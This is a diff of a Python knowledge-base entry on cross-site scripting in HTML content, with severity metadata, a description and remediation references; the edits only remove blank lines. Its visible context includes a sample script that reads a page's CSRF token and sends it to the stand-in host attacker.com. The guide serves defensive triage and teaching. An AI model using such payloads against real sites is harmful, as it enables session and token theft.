@@ -13,7 +13,6 @@ Knowledge Base: HTML Content Context - Comprehensive Guide
 
 DETAILS = {
     "title": "Cross-Site Scripting (XSS) in HTML Content",
-    
     # Metadata for SIEM/Triage Integration
     "severity": "critical",
     "cvss_score": 8.8,
@@ -22,7 +21,6 @@ DETAILS = {
     "cwe": ["CWE-79"],
     "owasp": ["A03:2021"],
     "tags": ["xss", "html", "reflected", "stored", "injection"],
-    
     "description": """
 User input is reflected directly into the HTML body without proper sanitization. This is the most 
 straightforward and dangerous XSS vector, allowing injection of arbitrary HTML elements, scripts, 
@@ -47,7 +45,6 @@ This is common in:
 SEVERITY: CRITICAL
 This vulnerability consistently ranks in OWASP Top 10 and is the foundation for most XSS attacks.
 """,
-
     "attack_vector": """
 CLASSIC ATTACK VECTORS:
 
@@ -199,7 +196,6 @@ var csrf=document.querySelector('[name=csrf_token]').value;
 fetch('//attacker.com/csrf?t='+csrf);
 </script>
 """,
-
     "remediation": """
 DEFENSE-IN-DEPTH STRATEGY:
 
@@ -403,5 +399,5 @@ OWASP REFERENCES:
 - OWASP XSS Prevention Cheat Sheet
 - OWASP Testing Guide: Testing for Reflected XSS
 - OWASP Testing Guide: Testing for Stored XSS
-"""
+""",
 }
